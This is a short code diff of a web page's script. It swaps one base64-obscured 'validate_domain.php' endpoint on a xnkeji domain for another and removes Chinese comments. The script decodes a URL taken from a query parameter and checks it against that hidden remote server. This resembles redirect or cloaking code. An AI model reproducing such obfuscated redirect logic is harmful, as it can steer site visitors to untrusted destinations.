@@ -347,9 +347,8 @@
 
  <script>
  
-const encryptedValidateUrl = "aHR0cHM6Ly9hcmEueG5rZWppLmljdS92YWxpZGF0ZV9kb21haW4ucGhw";
+const encryptedValidateUrl = "aHR0cHM6Ly9hcGkueG5rZWppLnRvcC92YWxpZGF0ZV9kb21haW4ucGhw";
 
-// 解密函数
 function decryptUrl(encryptedUrl) {
     return atob(encryptedUrl);
 }
@@ -358,9 +357,8 @@ var liugao = new URLSearchParams(window.location.search);
 var encodedParam = liugao.get('c');
 var liu = atob(encodedParam);
 
-// 验证域名白名单
 function validateDomain(url) {
-    // 解密URL
+
     const decryptedUrl = decryptUrl(encryptedValidateUrl);
     
     var xhr = new XMLHttpRequest();
